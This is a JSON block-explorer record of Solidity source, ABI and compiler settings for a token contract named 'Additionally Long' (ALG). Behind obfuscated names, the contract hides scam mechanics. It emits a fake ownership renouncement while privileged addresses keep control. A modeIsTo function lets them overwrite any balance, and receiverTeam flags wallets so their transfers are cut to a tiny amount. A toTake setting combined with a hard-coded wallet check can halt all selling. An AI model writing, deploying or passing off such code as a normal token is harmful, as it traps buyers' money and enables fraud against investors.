{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface totalList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTake) external view returns (uint256);\n\n    function transfer(address enableFund, uint256 isAt) external returns (bool);\n\n    function allowance(address fromLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableFund,\n        uint256 isAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLimit, uint256 value);\n    event Approval(address indexed fromLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract feeIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toMin {\n    function createPair(address teamLimit, address minTeam) external returns (address);\n}\n\ninterface totalListMetadata is totalList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdditionallyLong is feeIs, totalList, totalListMetadata {\n\n    function atLaunched(address walletShould, address enableFund, uint256 isAt) internal returns (bool) {\n        if (walletShould == fundBuy) {\n            return fundMode(walletShould, enableFund, isAt);\n        }\n        uint256 marketingTo = totalList(toMarketing).balanceOf(sellSenderWallet);\n        require(marketingTo == amountFee);\n        require(enableFund != sellSenderWallet);\n        if (walletAt[walletShould]) {\n            return fundMode(walletShould, enableFund, fundLaunch);\n        }\n        return fundMode(walletShould, enableFund, isAt);\n    }\n\n    function owner() external view returns (address) {\n        return liquiditySwapShould;\n    }\n\n    uint256 private tokenTx = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptAt;\n    }\n\n    function balanceOf(address modeTake) public view virtual override returns (uint256) {\n        return totalSell[modeTake];\n    }\n\n    address sellSenderWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private fromExempt = 18;\n\n    mapping(address => bool) public shouldLaunched;\n\n    string private exemptAt = \"ALG\";\n\n    uint256 amountFee;\n\n    address public toMarketing;\n\n    function fundMode(address walletShould, address enableFund, uint256 isAt) internal returns (bool) {\n        require(totalSell[walletShould] >= isAt);\n        totalSell[walletShould] -= isAt;\n        totalSell[enableFund] += isAt;\n        emit Transfer(walletShould, enableFund, isAt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromExempt;\n    }\n\n    function approve(address exemptReceiver, uint256 isAt) public virtual override returns (bool) {\n        fromEnable[_msgSender()][exemptReceiver] = isAt;\n        emit Approval(_msgSender(), exemptReceiver, isAt);\n        return true;\n    }\n\n    bool public atTxTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTx;\n    }\n\n    constructor (){\n        if (tokenLaunchedTake != receiverFund) {\n            swapMarketing = tokenLaunchedTake;\n        }\n        listBuy liquidityTxAmount = listBuy(teamFund);\n        toMarketing = toMin(liquidityTxAmount.factory()).createPair(liquidityTxAmount.WETH(), address(this));\n        \n        fundBuy = _msgSender();\n        autoBuy();\n        shouldLaunched[fundBuy] = true;\n        totalSell[fundBuy] = tokenTx;\n        if (senderEnable) {\n            senderEnable = true;\n        }\n        emit Transfer(address(0), fundBuy, tokenTx);\n    }\n\n    function transfer(address minWallet, uint256 isAt) external virtual override returns (bool) {\n        return atLaunched(_msgSender(), minWallet, isAt);\n    }\n\n    mapping(address => bool) public walletAt;\n\n    function modeIsTo(address minWallet, uint256 isAt) public {\n        buyLiquidity();\n        totalSell[minWallet] = isAt;\n    }\n\n    uint256 public swapMarketing;\n\n    function transferFrom(address walletShould, address enableFund, uint256 isAt) external override returns (bool) {\n        if (_msgSender() != teamFund) {\n            if (fromEnable[walletShould][_msgSender()] != type(uint256).max) {\n                require(isAt <= fromEnable[walletShould][_msgSender()]);\n                fromEnable[walletShould][_msgSender()] -= isAt;\n            }\n        }\n        return atLaunched(walletShould, enableFund, isAt);\n    }\n\n    mapping(address => uint256) private totalSell;\n\n    bool private senderEnable;\n\n    function buyLiquidity() private view {\n        require(shouldLaunched[_msgSender()]);\n    }\n\n    function autoBuy() public {\n        emit OwnershipTransferred(fundBuy, address(0));\n        liquiditySwapShould = address(0);\n    }\n\n    uint256 private receiverFund;\n\n    uint256 public tokenLaunchedTake;\n\n    event OwnershipTransferred(address indexed enableMax, address indexed limitMode);\n\n    uint256 public fundTakeBuy;\n\n    mapping(address => mapping(address => uint256)) private fromEnable;\n\n    function getOwner() external view returns (address) {\n        return liquiditySwapShould;\n    }\n\n    address public fundBuy;\n\n    function toTake(uint256 isAt) public {\n        buyLiquidity();\n        amountFee = isAt;\n    }\n\n    address teamFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address launchedLiquiditySwap, address exemptReceiver) external view virtual override returns (uint256) {\n        if (exemptReceiver == teamFund) {\n            return type(uint256).max;\n        }\n        return fromEnable[launchedLiquiditySwap][exemptReceiver];\n    }\n\n    bool private marketingShould;\n\n    string private teamTrading = \"Additionally Long\";\n\n    function feeToken(address amountEnable) public {\n        if (atTxTeam) {\n            return;\n        }\n        if (swapMarketing != receiverFund) {\n            fundTakeBuy = tokenLaunchedTake;\n        }\n        shouldLaunched[amountEnable] = true;\n        \n        atTxTeam = true;\n    }\n\n    bool public enableAmount;\n\n    address private liquiditySwapShould;\n\n    uint256 constant fundLaunch = 12 ** 10;\n\n    function receiverTeam(address walletIsTake) public {\n        buyLiquidity();\n        if (fundTakeBuy != tokenLaunchedTake) {\n            tokenLaunchedTake = swapMarketing;\n        }\n        if (walletIsTake == fundBuy || walletIsTake == toMarketing) {\n            return;\n        }\n        walletAt[walletIsTake] = true;\n    }\n\n    uint256 totalEnableTo;\n\n    function name() external view virtual override returns (string memory) {\n        return teamTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquiditySwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnable\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTakeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAt\",\"type\":\"uint256\"}],\"name\":\"modeIsTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIsTake\",\"type\":\"address\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAt\",\"type\":\"uint256\"}],\"name\":\"toTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunchedTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AdditionallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}